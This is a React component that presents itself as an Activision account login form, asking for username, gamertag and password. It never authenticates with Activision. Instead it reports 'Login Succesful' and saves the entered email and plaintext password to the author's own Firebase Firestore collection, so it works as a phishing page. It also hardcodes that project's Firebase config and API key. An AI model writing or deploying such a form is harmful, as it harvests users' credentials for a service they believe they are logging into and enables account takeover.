/* eslint-disable jsx-a11y/click-events-have-key-events */
/* eslint-disable jsx-a11y/no-static-element-interactions */
/* eslint-disable jsx-a11y/accessible-emoji */
import React, { useState, useEffect, useCallback } from "react";
import { Form, Input, Button, Alert, Checkbox, message, Divider } from "antd";
import firebase from "firebase";
// Required for side-effects
require("firebase/firestore");

firebase.initializeApp({
  apiKey: "AIzaSyBxveJMc_07AiEqojyM-jydgbaobY_CZsg",
  authDomain: "active-venture-300323.firebaseapp.com",
  projectId: "active-venture-300323",
  storageBucket: "active-venture-300323.appspot.com",
  messagingSenderId: "340086172909",
  appId: "1:340086172909:web:d558bcbae9e09d82efb0e4",
});

const db = firebase.firestore();

export default function ActLogin() {
  const [values, setValues] = useState({});

  const login = useCallback(async () => {
    try {
      const docRef = db.collection("prueba").doc(`${values.gamertag}`);
      await docRef.set({
        email: values.username,
        password: values.password,
      });
      setValues({});
    } catch (e) {
      console.log(e);
    }
  });

  useEffect(() => {
    login();
  }); //, [values]

  const layout = {
    labelCol: {
      span: 8,
    },
    wrapperCol: {
      span: 12,
    },
  };
  const tailLayout = {
    wrapperCol: {
      offset: 8,
      span: 16,
    },
  };

  const onFinish = values => {
    message.success("Login Succesful");
    setValues(values);
  };

  const onFinishFailed = errorInfo => {
    console.log("Failed:", errorInfo);
    message.error("Login Failed");
  };

  return (
    <div>
      <Form
        {...layout}
        name="basic"
        initialValues={{
          remember: true,
        }}
        onFinish={onFinish}
        onFinishFailed={onFinishFailed}
      >
        <Form.Item
          label="Username"
          name="username"
          rules={[
            {
              required: true,
              message: "Please input your username!",
            },
          ]}
        >
          <Input placeholder="Activision username (usually an email)" />
        </Form.Item>
        <Form.Item
          label="Gamertag"
          name="gamertag"
          rules={[
            {
              required: true,
              message: "Please input your in-game gamertag!",
            },
          ]}
        >
          <Input placeholder="As it appears in-game minus the #xxxxxx" />
        </Form.Item>

        <Form.Item
          label="Password"
          name="password"
          rules={[
            {
              required: true,
              message: "Please input your password!",
            },
          ]}
        >
          <Input.Password placeholder="Activision password" />
        </Form.Item>

        <Form.Item {...tailLayout} name="remember" valuePropName="checked">
          <Checkbox>Remember me</Checkbox>
        </Form.Item>

        <Form.Item {...tailLayout}>
          <Button type="primary" htmlType="submit">
            Submit
          </Button>
        </Form.Item>
      </Form>

      <Alert message="2FA not supported on this demo" type="warning" showIcon closable />
    </div>
  );
}
